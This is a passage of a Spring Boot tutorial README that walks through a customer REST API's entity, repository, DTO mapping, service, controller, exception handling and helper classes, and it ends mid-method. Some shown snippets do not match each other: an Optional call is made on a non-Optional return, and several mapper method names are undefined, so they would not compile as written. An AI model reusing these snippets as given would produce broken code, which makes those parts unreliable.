import org.hibernate.proxy.HibernateProxy;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.Objects;

@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
@Entity
@Table(name = ""customers"")
public class Customer {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false)
    private String firstName;

    @Column(nullable = false)
    private String lastName;

    @Column(nullable = false, unique = true)
    private String email;

    private String phoneNumber;

    private LocalDate dateOfBirth;

    @CreationTimestamp
    @Column(nullable = false, updatable = false)
    private LocalDateTime createdDate;

    @UpdateTimestamp
    private LocalDateTime updatedDate;

    @Override
    public final boolean equals(Object o) {
        if (this == o) return true;
        if (o == null) return false;
        Class<?> oEffectiveClass = o instanceof HibernateProxy hibernateProxy ? hibernateProxy.getHibernateLazyInitializer().getPersistentClass() : o.getClass();
        Class<?> thisEffectiveClass = this instanceof HibernateProxy hibernateProxy ? hibernateProxy.getHibernateLazyInitializer().getPersistentClass() : this.getClass();
        if (thisEffectiveClass != oEffectiveClass) return false;
        Customer customer = (Customer) o;
        return getId() != null && Objects.equals(getId(), customer.getId());
    }

    @Override
    public final int hashCode() {
        return this instanceof HibernateProxy hibernateProxy ? hibernateProxy.getHibernateLazyInitializer().getPersistentClass().hashCode() : getClass().hashCode();
    }
}
```

</details>

### Why Not Use `@Data`?

While `@Data` is a convenient annotation provided by Lombok that generates getters, setters, `toString()`, `equals()`,
and `hashCode()` methods, it is not recommended for use with JPA entities (I got this warning from JPA Buddy plugin).
Using `@Data` in JPA entities can lead to severe performance and memory consumption issues. Additionally, `@Data`
generates `equals()` and `hashCode()` methods that might not be suitable for entities, particularly in cases involving
entity relationships and lazy loading.

### Importance of `equals()` and `hashCode()`

- **`equals()`**: This method determines whether two instances are considered equal. For JPA entities, this typically
  means comparing the primary key (ID). Properly implementing `equals()` ensures that the entity behaves correctly when
  compared in collections or when managed by the persistence context.


- **`hashCode()`**: This method provides a hash code for the entity, which is essential for its use in hash-based
  collections like `HashSet` or `HashMap`. Properly implementing `hashCode()` ensures consistency and correctness when
  the entity is stored or retrieved from such collections.

For more details on why these methods are important and best practices for implementing them, you can find  
resources and discussions online.

### Additional Column Specification

You can also specify the name of the column in the database using the `@Column(name = ""column_name"")` annotation.
This is useful when the field name in the entity class differs from the column name in the database table.

**Example**:

```java

@Column(name = ""first_name"", nullable = false)
private String firstName;
```

**Note**: If you do not specify the column name and the property is in camelCase, the column name will automatically be
converted to snake_case in most databases. For example, if your entity has a field named `firstName`, it will be mapped
to a column named `first_name` by default.

<br><br>

### Repository Layer

- **Purpose**: The repository layer handles CRUD operations for entities using Spring Data JPA, allowing you to
  interact with the database without writing SQL.
- **Package**: `repository`
- **Example Class**:
    - `CustomerRepository.java`: Manages CRUD operations for the `Customer` entity.

- **Key Concepts**:
    - **`extends JpaRepository<Customer, Long>`**: By extending `JpaRepository`, Spring Boot automatically configures a
      repository bean for you. This bean is a proxy implementation of `SimpleJpaRepository`, which provides all the
      necessary CRUD operations and query methods for the `Customer` entity. No need for `@Repository` or `@Component`
      annotationsâ€”Spring handles the configuration.

<details>
  <summary>View CustomerRepository code</summary>

```java
package com.ainigma100.customerapi.repository;

import com.ainigma100.customerapi.entity.Customer;
import org.springframework.data.jpa.repository.JpaRepository;

public interface CustomerRepository extends JpaRepository<Customer, Long> {

    Customer findByEmail(String email);

}
```

</details>

### Query Methods Overview

Spring Data JPA offers several ways to write queries in your repository interfaces, including:

#### 1. Derived Query Methods

You can create simple queries by following naming conventions.

**Example**:

```java
List<Customer> findByLastName(String lastName);
```

<br>

#### 2. Custom Queries with @Query

For more complex queries, you can use the @Query annotation.

**Example**:

```java
import org.springframework.data.repository.query.Param;

@Query(""SELECT c FROM Customer c WHERE c.email = :email"")
Customer findByEmail(@Param(""email"") String email);
```

<br>

#### 3. Native Queries

You can write native SQL queries using the @Query annotation and providing an extra parameter `nativeQuery = true`.

**Example**:

```java
import org.springframework.data.repository.query.Param;

@Query(value = ""SELECT * FROM customers WHERE status = :status"", nativeQuery = true)
List<Customer> findByStatus(@Param(""status"") String status);
```

<br>

### When to Use Native Queries

- **Advantages**: Native queries can be useful when you need to leverage database-specific features, optimize
  performance, or execute complex SQL that might not be easily expressed in JPQL (Java Persistence Query Language).


- **Disadvantages**: However, native queries can reduce the portability of your application across different database
  systems since they are tied to a specific SQL dialect. They also bypass some of the safety checks and optimizations
  provided by JPQL, such as automatic mapping of query results to entities.


- **Best Practice**: Prefer using JPQL or derived query methods for most queries to maintain portability and leverage
  JPA's features. Use native queries only when necessary for performance optimization or when dealing with complex
  queries that JPQL cannot handle efficiently.

<br><br>

### DTOs and MapStruct

DTOs (Data Transfer Objects) are used to transfer data between the service layer and the controller layer. They are
simple POJOs (Plain Old Java Objects) that contain only the necessary data and are often used to decouple the internal
entity models from the external API contract.

#### Key Concepts:

- **DTO Usage**:
    - DTOs ensure that only relevant information is exposed to the client. They help in shaping the data according to
      the needs of the client while hiding unnecessary internal details.
    - DTOs can also include validation annotations, ensuring that the data received or sent is valid according to
      business rules.


- **MapStruct for Mapping**:
    - **Automatic Mapping**: MapStruct automatically maps fields with the same name between entity classes and DTOs. For
      fields with different names, you can use the `@Mapping` annotation.
    - **Custom and Complex Mappings**: Allows custom mappings for complex scenarios, including nested objects and
      expression-based mappings.
    - **Performance**: MapStruct is efficient, generating simple, plain Java code for mappings without using reflection,
      making it faster than many other frameworks.
    - **Null Handling and Collection Mapping**: Offers control over how null values are handled and supports mapping
      between collections, such as lists of entities to lists of DTOs.
    - **Flexible Integration**: Easily integrates with Spring or other dependency injection frameworks by customizing
      the component model.

**Note**: You can find more information on MapStruct online.

Below is an example of a DTO and a corresponding MapStruct mapper interface:


<details>
  <summary>View CustomerDTO code</summary>

```java
package com.ainigma100.customerapi.dto;

import lombok.*;

import java.time.LocalDate;

@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
public class CustomerDTO {

    private Long id;
    private String firstName;
    private String lastName;
    private String email;
    private String phoneNumber;
    private LocalDate dateOfBirth;

}
```

</details>

<details>
  <summary>View CustomerMapper code</summary>

```java
package com.ainigma100.customerapi.mapper;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.entity.Customer;
import org.mapstruct.Mapper;

import java.util.List;

@Mapper(componentModel = ""spring"")
public interface CustomerMapper {

    Customer toCustomer(CustomerDTO customerDTO);

    CustomerDTO toCustomerDTO(Customer customer);

    List<Customer> toCustomerList(List<CustomerDTO> customerDTOList);

    List<CustomerDTO> toCustomerDTOList(List<Customer> customerList);

}
```

</details>


<br><br>

### Service Layer

The service layer in a Spring Boot application contains the business logic of the application. It acts as an
intermediary
between the controller layer (handling HTTP requests) and the repository layer (interacting with the database).

#### Key Concepts:

- **Interface and Implementation**: It's a good practice to define a service interface and then provide its
  implementation.
  This approach promotes loose coupling and makes your code more modular and easier to test. The interface defines the
  contract for the service, while the implementation class contains the actual business logic.

  **Example**:
    - `CustomerService`: Interface that defines methods for customer-related operations.
    - `CustomerServiceImpl`: Implementation class that provides the logic for methods like retrieving customers,
      updating customer details, etc.


- **Returning DTOs**: The service layer should not return entities directly. Instead, it should return Data Transfer
  Objects (DTOs).
  DTOs are simple objects that carry data between layers. They are particularly useful for exposing only the necessary
  data to the client and for avoiding exposing the internal structure of your entities.

<details>
  <summary>View CustomerService code</summary>

```java
package com.ainigma100.customerapi.service;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.dto.CustomerSearchCriteriaDTO;
import org.springframework.data.domain.Page;

public interface CustomerService {

    CustomerDTO createCustomer(CustomerDTO customerDTO);

    CustomerDTO getCustomerById(Long id);

    CustomerDTO updateCustomer(Long id, CustomerDTO customerDTO);

    CustomerDTO updateCustomerEmail(Long id, CustomerEmailUpdateDTO emailUpdateDTO);

    void deleteCustomer(Long id);

}
```

</details>

<details>
  <summary>View CustomerServiceImpl code</summary>

```java
package com.ainigma100.customerapi.service.impl;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.entity.Customer;
import com.ainigma100.customerapi.exception.ResourceAlreadyExistException;
import com.ainigma100.customerapi.exception.ResourceNotFoundException;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.repository.CustomerRepository;
import com.ainigma100.customerapi.service.CustomerService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

@Slf4j
@RequiredArgsConstructor
@Service
public class CustomerServiceImpl implements CustomerService {

    private final CustomerRepository customerRepository;
    private final CustomerMapper customerMapper;

    @Override
    public CustomerDTO createCustomer(CustomerDTO customerDTO) {

        customerRepository.findByEmail(customerDTO.getEmail())
                .ifPresent(customer -> {
                    throw new ResourceAlreadyExistException(""Customer"", ""email"", customerDTO.getEmail());
                });

        Customer recordToBeSaved = customerMapper.customerDTOToCustomer(customerDTO);

        Customer savedRecord = customerRepository.save(recordToBeSaved);

        return customerMapper.customerToCustomerDTO(savedRecord);
    }

    @Override
    public CustomerDTO getCustomerById(Long id) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        return customerMapper.toCustomerDTO(recordFromDB);
    }

    @Override
    public CustomerDTO updateCustomer(Long id, CustomerDTO customerDTO) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        // just to be safe that the object does not have another id
        customerDTO.setId(recordFromDB.getId());

        Customer recordToBeSaved = customerMapper.toCustomer(customerDTO);

        Customer savedRecord = customerRepository.save(recordToBeSaved);

        return customerMapper.toCustomerDTO(savedRecord);
    }

    @Override
    public CustomerDTO updateCustomerEmail(Long id, CustomerEmailUpdateDTO emailUpdateDTO) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        recordFromDB.setEmail(emailUpdateDTO.getEmail());

        Customer savedRecord = customerRepository.save(recordFromDB);

        return customerMapper.customerToCustomerDTO(savedRecord);

    }

    @Override
    public void deleteCustomer(Long id) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        customerRepository.delete(recordFromDB);
    }
}
```

</details>


<br><br>

### Controller Layer

The controller layer in a Spring Boot application handles incoming HTTP requests and sends responses back to the client.
It acts as the entry point for the client, interacting with the service layer to process business logic and return the
appropriate data. **Note**: Do not add business logic in this class.

#### Key Concepts:

- **Using Wrapper Objects**:
    - It's a best practice to return a wrapper object from the controller rather than returning entities directly. A
      wrapper object can contain a DTO, along with metadata such as status codes, messages, or other relevant
      information.
    - **Advantages**:
        - **Encapsulation**: The wrapper object encapsulates the DTO and provides a consistent response format, which
          can be useful for clients to process responses reliably.
        - **Security**: By using DTOs inside wrapper objects, you avoid exposing the internal structure of your entities
          directly to the client. This helps in protecting sensitive information and reducing the risk of exposing
          unintended data.
        - **Flexibility**: Wrapper objects allow you to include additional information, such as error messages or
          pagination details, making your API responses more informative and easier to handle on the client side.

    - **Example**:
        - `APIResponse<CustomerDTO>`: A wrapper object that contains the `CustomerDTO` and additional metadata like
          status and messages.

    - **Wrapper Class for API Responses: `APIResponse<T>`**:
        - The `APIResponse<T>` class is a generic wrapper that can be used across different controllers in your
          application. It encapsulates the response data and adds useful metadata like status and error messages.
        - **Key Attributes**:
            - `status`: A string representing the status of the response (e.g., ""SUCCESS"" or ""FAILED"").
            - `errors`: A list of `ErrorDTO` objects that contain error details when a request fails.
            - `results`: The actual data (DTO) being returned by the API.

        - **Example**:
      ```java
      @Data
      @AllArgsConstructor
      @NoArgsConstructor
      @JsonInclude(JsonInclude.Include.NON_NULL)
      @Builder
      public class APIResponse<T> {
      
          private String status;
          private List<ErrorDTO> errors;
          private T results;
      
      }
      ```

This structured approach ensures that your application is well-organized, with clear separation of concerns between
different layers. It also makes your API more robust, secure, and easier to maintain.

#### HTTP Method Annotations:

- **`@GetMapping`**:
    - **Purpose**: Maps HTTP GET requests to a specific handler method. It is typically used to retrieve data from the
      server.
    - **Usage**: Do not include a request body in GET requests. Use path variables or query parameters to pass data to
      the server.
    - **Example**:
      ```java
      @GetMapping(""/{id}"")
      public ResponseEntity<APIResponse<CustomerDTO>> getCustomerById(@PathVariable(""id"") Long id) {
          // You will have your implementation
      }
      ```

- **`@PostMapping`**:
    - **Purpose**: Maps HTTP POST requests to a specific handler method. It is used to create new resources on the
      server.
    - **Usage**: Use `@RequestBody` to pass data in the request body when creating a new resource.
    - **Example**:
      ```java
      @PostMapping
      public ResponseEntity<APIResponse<CustomerDTO>> createCustomer(@Valid @RequestBody CustomerRequestDTO customerRequestDTO) {
          // You will have your implementation
      }
      ```

- **`@PutMapping`**:
    - **Purpose**: Maps HTTP PUT requests to a specific handler method. It is used to update an existing resource on the
      server.
    - **Usage**: Use `@RequestBody` to pass updated data in the request body. PUT typically replaces the entire
      resource.
    - **Example**:
      ```java
      @PutMapping(""/{id}"")
      public ResponseEntity<APIResponse<CustomerDTO>> updateCustomer(@PathVariable(""id"") Long id, @Valid @RequestBody CustomerRequestDTO customerRequestDTO) {
          // You will have your implementation
      }
      ```

- **`@PatchMapping`**:
    - **Purpose**: Maps HTTP PATCH requests to a specific handler method. It is used to apply partial updates to a
      resource.
    - **Usage**: Use `@RequestBody` to pass only the fields that need to be updated. PATCH is useful when you want to
      modify only certain attributes of the resource without affecting the rest.
    - **Example**:
      ```java
      @PatchMapping(""/{id}"")
      public ResponseEntity<APIResponse<CustomerDTO>> partiallyUpdateCustomer(@PathVariable(""id"") Long id, @RequestBody CustomerEmailUpdateDTO customerEmailUpdateDTO) {
          // You will have your implementation
      }
      ```

- **`@DeleteMapping`**:
    - **Purpose**: Maps HTTP DELETE requests to a specific handler method. It is used to delete a resource from the
      server.
    - **Usage**: Typically does not require a request body. The resource to be deleted is usually specified in the path.
    - **Example**:
      ```java
      @DeleteMapping(""/{id}"")
      public ResponseEntity<APIResponse<String>> deleteCustomer(@PathVariable(""id"") Long id) {
          // You will have your implementation
      }
      ```

- **Difference Between `PUT` and `PATCH`**:
    - **PUT**: Replaces the entire resource with the new data provided. If some fields are not provided, they will be
      overwritten with null or default values.
    - **PATCH**: Applies partial updates to a resource. Only the fields provided in the request body will be updated,
      leaving the other fields unchanged.

<details>
  <summary>View CustomerController code</summary>

```java
package com.ainigma100.customerapi.controller;


import com.ainigma100.customerapi.dto.*;
import com.ainigma100.customerapi.enums.Status;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.service.CustomerService;
import io.swagger.v3.oas.annotations.Operation;
import jakarta.validation.Valid;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

@RequiredArgsConstructor
@RequestMapping(""/api/v1/customers"")
@RestController
public class CustomerController {

    private final CustomerService customerService;
    private final CustomerMapper customerMapper;


    @Operation(summary = ""Add a new customer"")
    @PostMapping
    public ResponseEntity<APIResponse<CustomerDTO>> createCustomer(
            @Valid @RequestBody CustomerRequestDTO customerRequestDTO) {

        CustomerDTO customerDTO = customerMapper.customerRequestDTOToCustomerDTO(customerRequestDTO);

        CustomerDTO result = customerService.createCustomer(customerDTO);

        // Builder Design pattern
        APIResponse<CustomerDTO> response = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();

        return new ResponseEntity<>(response, HttpStatus.CREATED);
    }


    @Operation(summary = ""Find customer by ID"",
            description = ""Returns a single customer"")
    @GetMapping(""/{id}"")
    public ResponseEntity<APIResponse<CustomerDTO>> getCustomerById(@PathVariable(""id"") Long id) {

        CustomerDTO result = customerService.getCustomerById(id);

        // Builder Design pattern
        APIResponse<CustomerDTO> responseDTO = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();


        return new ResponseEntity<>(responseDTO, HttpStatus.OK);

    }


    @Operation(summary = ""Update an existing customer"")
    @PutMapping(""/{id}"")
    public ResponseEntity<APIResponse<CustomerDTO>> updateCustomer(
            @PathVariable(""id"") Long id,
            @Valid @RequestBody CustomerRequestDTO customerRequestDTO) {

        CustomerDTO customerDTO = customerMapper.customerRequestDTOToCustomerDTO(customerRequestDTO);

        CustomerDTO result = customerService.updateCustomer(id, customerDTO);

        // Builder Design pattern
        APIResponse<CustomerDTO> responseDTO = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();


        return new ResponseEntity<>(responseDTO, HttpStatus.OK);

    }

    @Operation(summary = ""Partially update a customer's email"")
    @PatchMapping(""/{id}/email"")
    public ResponseEntity<APIResponse<CustomerDTO>> updateCustomerEmail(
            @PathVariable(""id"") Long id,
            @Valid @RequestBody CustomerEmailUpdateDTO emailUpdateDTO) {

        CustomerDTO result = customerService.updateCustomerEmail(id, emailUpdateDTO);

        // Builder Design pattern
        APIResponse<CustomerDTO> response = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();

        return new ResponseEntity<>(response, HttpStatus.OK);
    }


    @Operation(summary = ""Delete a customer by ID"")
    @DeleteMapping(""/{id}"")
    public ResponseEntity<APIResponse<String>> deleteCustomer(@PathVariable(""id"") Long id) {

        customerService.deleteCustomer(id);

        String result = ""Customer deleted successfully"";

        // Builder Design pattern
        APIResponse<String> responseDTO = APIResponse
                .<String>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();


        return new ResponseEntity<>(responseDTO, HttpStatus.OK);

    }

}
```

</details>


<br><br>

### Exception Handling

In a Spring Boot application, it's important to handle exceptions in a way that provides meaningful feedback to the
client while maintaining a clean and maintainable codebase. In addition, you have to be sure not to expose sensitive
data.
The `GlobalExceptionHandler` class in this project serves this purpose by centralizing exception handling and ensuring
consistent error responses across the entire application.

#### Global Exception Handler

The `GlobalExceptionHandler` class, annotated with `@ControllerAdvice`, intercepts exceptions thrown by any controller
in the application. This class defines several `@ExceptionHandler` methods to handle specific types of exceptions,
ensuring that the application responds with appropriate HTTP status codes and error messages.

**Key Features of `GlobalExceptionHandler`:**

- **Runtime Exceptions**: Handles general runtime exceptions, such as `NullPointerException` and `RuntimeException`,
  returning a 500 Internal Server Error response.
- **Resource Not Found**: Manages `ResourceNotFoundException`, returning a 404 Not Found status with a relevant error
  message.
- **Business Logic and Data Exceptions**: Handles custom exceptions like `ResourceAlreadyExistException`, and
  `DataAccessException`, providing a 400 Bad Request response.
- **Validation Exceptions**: Manages exceptions related to validation, such as `MethodArgumentNotValidException` and
  `ConstraintViolationException`, returning detailed validation error messages.
- **Malformed JSON**: Handles `HttpMessageNotReadableException` to catch and respond to improperly formatted JSON in
  requests.
- **Method Not Supported**: Catches `HttpRequestMethodNotSupportedException`, responding with a 405 Method Not Allowed
  status.

#### Custom Exceptions

The application also defines several custom exceptions to manage specific error scenarios:

- **`BusinessLogicException`**: Thrown when a business rule is violated.
- **`ResourceAlreadyExistException`**: Used when an attempt is made to create a resource that already exists.
- **`ResourceNotFoundException`**: Thrown when a requested resource is not found in the database.

These custom exceptions extend `RuntimeException` and are annotated with `@ResponseStatus` to map them to specific HTTP
status codes.

#### Structured Error Responses

To ensure that error responses are consistent, the `APIResponse` class is used to structure the response body. It
includes:

- **Status**: A string indicating the outcome of the request (e.g., ""FAILED"").
- **Errors**: A list of `ErrorDTO` objects, each containing a `field` and an `errorMessage` to describe the issue.

This structure ensures that clients receive clear and consistent error messages, which can be easily parsed and handled.

**Note**: This approach to exception handling improves the robustness of the application, making it more maintainable
and user-friendly. For more details on how to implement and extend this global exception handler, you can refer to
additional resources or documentation available online.


<details>
  <summary>View GlobalExceptionHandler code</summary>

```java
package com.ainigma100.customerapi.exception;

import com.ainigma100.customerapi.dto.APIResponse;
import com.ainigma100.customerapi.dto.ErrorDTO;
import com.ainigma100.customerapi.enums.Status;
import jakarta.validation.ConstraintViolation;
import jakarta.validation.ConstraintViolationException;
import lombok.extern.slf4j.Slf4j;
import org.springframework.dao.DataAccessException;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.http.converter.HttpMessageNotReadableException;
import org.springframework.validation.FieldError;
import org.springframework.web.HttpRequestMethodNotSupportedException;
import org.springframework.web.bind.MethodArgumentNotValidException;
import org.springframework.web.bind.MissingPathVariableException;
import org.springframework.web.bind.MissingServletRequestParameterException;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

@Slf4j
@ControllerAdvice
public class GlobalExceptionHandler {


    @ExceptionHandler({RuntimeException.class, NullPointerException.class})
    public ResponseEntity<Object> handleRuntimeExceptions(RuntimeException exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""An internal server error occurred"")));

        log.error(""RuntimeException or NullPointerException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.INTERNAL_SERVER_ERROR);
    }


    @ExceptionHandler({ResourceNotFoundException.class})
    public ResponseEntity<Object> handleResourceNotFoundExceptions(ResourceNotFoundException exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""The requested resource was not found"")));

        log.error(""ResourceNotFoundException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.NOT_FOUND);
    }


    @ExceptionHandler({ResourceAlreadyExistException.class, DataAccessException.class})
    public ResponseEntity<Object> handleOtherExceptions(Exception exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""An error occurred while processing your request"")));

        log.error(""ResourceAlreadyExistException or DataAccessException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.BAD_REQUEST);
    }


    @ExceptionHandler(HttpRequestMethodNotSupportedException.class)
    public ResponseEntity<Object> handleHttpRequestMethodNotSupportedException(HttpRequestMethodNotSupportedException exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""The requested URL does not support this method"")));

        log.error(""HttpRequestMethodNotSupportedException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.METHOD_NOT_ALLOWED);
    }


    @ExceptionHandler({MethodArgumentNotValidException.class, MissingServletRequestParameterException.class, MissingPathVariableException.class})
    public ResponseEntity<Object> handleValidationExceptions(Exception exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());

        List<ErrorDTO> errors = new ArrayList<>();
        if (exception instanceof MethodArgumentNotValidException ex) {

            ex.getBindingResult().getAllErrors().forEach(error -> {
                String fieldName = ((FieldError) error).getField();
                String errorMessage = error.getDefaultMessage();
                errors.add(new ErrorDTO(fieldName, errorMessage));
            });

        } else if (exception instanceof MissingServletRequestParameterException ex) {

            String parameterName = ex.getParameterName();
            errors.add(new ErrorDTO("""", ""Required parameter is missing: "" + parameterName));

        } else if (exception instanceof MissingPathVariableException ex) {

            String variableName = ex.getVariableName();
            errors.add(new ErrorDTO("""", ""Missing path variable: "" + variableName));
        }

        log.error(""Validation errors: {}"", errors);

        response.setErrors(errors);
        return new ResponseEntity<>(response, HttpStatus.BAD_REQUEST);
    }


    @ExceptionHandler(HttpMessageNotReadableException.class)
    public ResponseEntity<APIResponse<ErrorDTO>> handleHttpMessageNotReadableException(HttpMessageNotReadableException ex) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""Malformed JSON request"")));

        log.error(""Malformed JSON request: {}"", ex.getMessage());

        return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
    }


    @ExceptionHandler(ConstraintViolationException.class)
    public ResponseEntity<APIResponse<ErrorDTO>> handleConstraintViolationException(ConstraintViolationException ex) {

        List<ErrorDTO> errors = new ArrayList<>();

        for (ConstraintViolation<?> violation : ex.getConstraintViolations()) {
            errors.add(new ErrorDTO(violation.getPropertyPath().toString(), violation.getMessage()));
        }

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(errors);

        log.error(""Constraint violation errors: {}"", errors);

        return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
    }


}
```

</details>



---

## 10. Helper Classes

In this section, I provide some helper classes that can be reused in Spring Boot applications. These classes are
designed
to simplify common tasks such as logging, server configuration, and OpenAPI documentation generation.

### OpenApiConfig

This configuration class is responsible for generating OpenAPI documentation using SpringDoc. It fetches the OpenAPI
JSON from the application's endpoints and saves it as a formatted file.

**Key Features**:

- Automatically generates OpenAPI documentation in JSON format.
- Saves the documentation to a specified file in the project root. The output file name is specified in the
  `application.yaml` file.
- Handles both HTTP and HTTPS protocols based on the server configuration.

<details>
  <summary>View OpenApiConfig code</summary>

```java
package com.ainigma100.customerapi.config;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import io.swagger.v3.oas.annotations.OpenAPIDefinition;
import io.swagger.v3.oas.annotations.info.Info;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.CommandLineRunner;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.env.Environment;
import org.springframework.web.client.RestClient;

import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Optional;

@Slf4j
@Configuration
@OpenAPIDefinition(info = @Info(
        title = ""${springdoc.title}"",
        version = ""${springdoc.version}"",
        description = ""Documentation ${spring.application.name} v1.0""
))
public class OpenApiConfig {


    private final Environment environment;

    public OpenApiConfig(Environment environment) {
        this.environment = environment;
    }

    @Value(""${server.port:8080}"")
    private int serverPort;

    @Value(""${openapi.output.file}"")
    private String outputFileName;

    private static final String SERVER_SSL_KEY_STORE = ""server.ssl.key-store"";
    private static final String SERVER_SERVLET_CONTEXT_PATH = ""server.servlet.context-path"";

    @Bean
    public CommandLineRunner generateOpenApiJson() {
        return args -> {
            String protocol = Optional.ofNullable(environment.getProperty(SERVER_SSL_KEY_STORE)).map(key -> ""https"").orElse(""http"");
            String host = getServerIP();
            String contextPath = Optional.ofNullable(environment.getProperty(SERVER_SERVLET_CONTEXT_PATH)).orElse("""");

            // Define the API docs URL
            String apiDocsUrl = String.format(""%s://%s:%d%s/v3/api-docs"", protocol, host, serverPort, contextPath);

            log.info(""Attempting to fetch OpenAPI docs from URL: {}"", apiDocsUrl);

            try {
                // Create RestClient instance
                RestClient restClient = RestClient.create();

                // Fetch the OpenAPI JSON
                String response = restClient.get()
                        .uri(apiDocsUrl)
                        .retrieve()
                        .body(String.class);

                // Format and save the JSON to a file
                formatAndSaveToFile(response, outputFileName);

                log.info(""OpenAPI documentation generated successfully at {}"", outputFileName);

            } catch (Exception e) {
                log.error(""Failed to generate OpenAPI documentation from URL: {}"", apiDocsUrl, e);
            }
        };
    }

    private String getServerIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            log.error(""Error resolving host address"", e);
            return ""unknown"";
        }
    }

    private void formatAndSaveToFile(String content, String fileName) {
        try {
            ObjectMapper objectMapper = new ObjectMapper();

            // Enable pretty-print
            objectMapper.enable(SerializationFeature.INDENT_OUTPUT);

            // Read the JSON content as a JsonNode
            JsonNode jsonNode = objectMapper.readTree(content);

            // Write the formatted JSON to a file
            objectMapper.writeValue(new File(fileName), jsonNode);

        } catch (IOException e) {
            log.error(""Error while saving JSON to file"", e);
        }
    }
}
```

</details>

### LoggingFilter

A servlet filter that logs incoming HTTP requests and outgoing responses. It excludes certain paths, such as those
related to Actuator and Swagger, from logging to reduce noise.

**Key Features**:

- Logs the client's IP address, request URL, and HTTP method.
- Logs the response status after the request is processed.
- Excludes paths related to Actuator, Swagger, and static resources from logging.

<details>
  <summary>View LoggingFilter code</summary>

```java
package com.ainigma100.customerapi.filter;

import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import java.io.IOException;

@Component
@Slf4j
public class LoggingFilter implements Filter {


    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        HttpServletRequest httpServletRequest = (HttpServletRequest) request;
        HttpServletResponse httpServletResponse = (HttpServletResponse) response;

        String clientIP = this.getClientIP(httpServletRequest);

        if (this.shouldLogRequest(httpServletRequest)) {
            log.info(""Client IP: {}, Request URL: {}, Method: {}"", clientIP, httpServletRequest.getRequestURL(), httpServletRequest.getMethod());
        }

        // pre methods call stamps
        chain.doFilter(request, response);

        // post method calls stamps
        if (this.shouldLogRequest(httpServletRequest)) {
            log.info(""Response status: {}"", httpServletResponse.getStatus());
        }

    }

    private boolean shouldLogRequest(HttpServletRequest request) {

        // (?i) enables case-insensitive matching, \b matched as whole words
        // reference: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions
